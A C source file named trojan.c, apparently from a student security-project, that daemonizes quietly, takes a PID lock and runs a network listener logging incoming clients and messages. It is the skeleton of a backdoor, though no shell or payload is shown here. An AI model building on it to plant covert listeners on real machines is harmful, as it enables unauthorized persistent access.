/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   trojan.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/01 15:20:54 by hivian            #+#    #+#             */
/*   Updated: 2017/06/02 15:08:31 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void		lock_file(t_env *e) {
	FILE	*lockfile = fopen(LOCK_PATH, "w+");

	if (fileno(lockfile) == -1) {
		fprintf(e->f_logs, "Could not open PID lock file %s, exiting\n", LOCK_PATH);
        exit(EXIT_FAILURE);
	}
	if (lockf(fileno(lockfile), F_TLOCK, 0) == -1) {
		fprintf(e->f_logs, "Could not lock PID lock file %s, exiting\n", LOCK_PATH);
        exit(EXIT_FAILURE);
	}
}

void		trojan(t_env *e)
{;
	signal_handler();
	pid_t process_id = 0;
	pid_t sid = 0;
	process_id = fork();
	if (process_id < 0)
	{
		printf("fork failed!\n");
		exit(1);
	}
	if (process_id > 0)
	{
		printf("process_id of child process %d \n", process_id);
		exit(0);
	}
	umask(027);
	sid = setsid();
	if(sid < 0)
	{
		exit(1);
	}
	chdir("/");
	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	if ((e->f_logs = fopen(LOG_PATH, "w+")) == NULL)
		exit(1);
	lock_file(e);
	create_server(e);
	int total_connection = 0;
	char buffer[256];
	bzero(buffer, sizeof(buffer));
	while (1)
	{
		fprintf(e->f_logs, "Waiting for a new connection.\n");
		fflush(e->f_logs);
		if ((e->csock = accept(e->hsock, (struct sockaddr *)&e->haddr, &e->haddr_size)) == -1)
			exit(1);
		if (total_connection < MAX_CLIENTS)
		{
			total_connection++;
			get_client_ip(e);
			fprintf(e->f_logs, "Received new connection: %s:%d\n", e->client_ip, e->client_port);
		}
		else
		{
			fprintf(e->f_logs, "Max number of users reached. Limit: %d\n", MAX_CLIENTS);
			close(e->csock);
		}
		int ret = read(e->csock, buffer, 256);
		if (ret < 0)
			fprintf(e->f_logs, "Read error\n");
		if (ret == 0)
			total_connection--;
		fprintf(e->f_logs, "Message: %s\n", buffer);
	}
	fclose(e->f_logs);
}
